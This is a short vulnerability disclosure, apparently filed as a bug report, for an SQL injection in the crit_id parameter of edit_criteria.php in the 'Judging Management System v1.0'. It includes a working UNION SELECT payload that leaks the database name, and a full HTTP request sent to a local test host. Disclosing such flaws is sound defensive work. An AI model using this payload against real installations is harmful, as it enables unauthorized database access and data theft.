# Judging Management System v1.0 by oretnom23 has SQL injection

BUG_Author: qingning988

vendors: https://www.sourcecodester.com/php/15910/judging-management-system-using-php-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /php-jms/edit_criteria.php?crit_id=

Vulnerability location: /php-jms/edit_criteria.php?crit_id=, crit_id

dbname =jms_db

[+] Payload: /php-jms/edit_criteria.php?crit_id=-1%27%20union%20select%201,2,database(),4,5--+ // Leak place ---> crit_id


```sql
GET /php-jms/edit_criteria.php?crit_id=-1%27%20union%20select%201,2,database(),4,5--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=f6bhcgo222sk31fnm99nf9tjt1
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/206374160-4ad71f2d-49c7-4919-9e0b-7df2786dcd60.png)
